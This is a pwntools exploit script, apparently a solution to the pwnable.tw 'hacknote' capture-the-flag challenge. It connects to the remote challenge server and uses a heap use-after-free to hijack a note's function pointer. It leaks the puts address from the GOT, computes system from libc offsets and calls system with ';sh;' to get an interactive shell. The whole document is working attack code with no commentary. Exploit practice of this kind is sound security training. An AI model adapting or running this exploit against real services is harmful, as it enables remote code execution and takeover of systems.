from pwn import *

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long

addr = "chall.pwnable.tw"
port = 10102
binary = "./hacknote"

elf = ELF(binary)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
print_content = 0x0804862B
libc = ELF("./libc_32.so")
system_offset = libc.symbols['puts'] - libc.symbols['system']

s = remote(addr, port)

def Display_HackNote():
    print s.recvuntil("----------------------")
    print s.recvuntil("       HackNote       ")
    print s.recvuntil("----------------------")
    print s.recvuntil(" 1. Add note          ")
    print s.recvuntil(" 2. Delete note       ")
    print s.recvuntil(" 3. Print note        ")
    print s.recvuntil(" 4. Exit              ")
    print s.recvuntil("----------------------")
    print s.recvuntil("Your choice :")

def Add(size, content):
    Display_HackNote()
    s.send("1")
    sleep(0.3)
    print s.recvuntil("Note size :")
    s.send(size)
    sleep(0.3)
    print s.recvuntil("Content :")
    s.send(content)
    sleep(0.3)
    print s.recvuntil("Success !")


def Delete(index):
    Display_HackNote()
    s.send("2")
    sleep(0.3)
    print s.recvuntil("Index :")
    s.send(index)
    sleep(0.3)
    print s.recvuntil("Success")

def Print(index):
    Display_HackNote()
    s.send("3")
    sleep(0.5)
    print s.recvuntil("Index :")
    s.send(index)
    sleep(0.5)

def trigger(func, args):
    Add("40", "AAAA")
    Add("40", "AAAA")
    Delete("0")
    Delete("1")
    Add("8", p32(func) + p32(args))

def leak():
    Print("0")
    puts_libc = up32(s.recv(4))
    print "puts libc : %x" % puts_libc
    return puts_libc

def exploit(system_libc):
    Delete("2")
    Add("8", p32(system_libc) + ";sh;")
    Print("0")

trigger(func=print_content, args=puts_got)
puts_libc = leak()
exploit(puts_libc - system_offset)

s.interactive()
s.close()
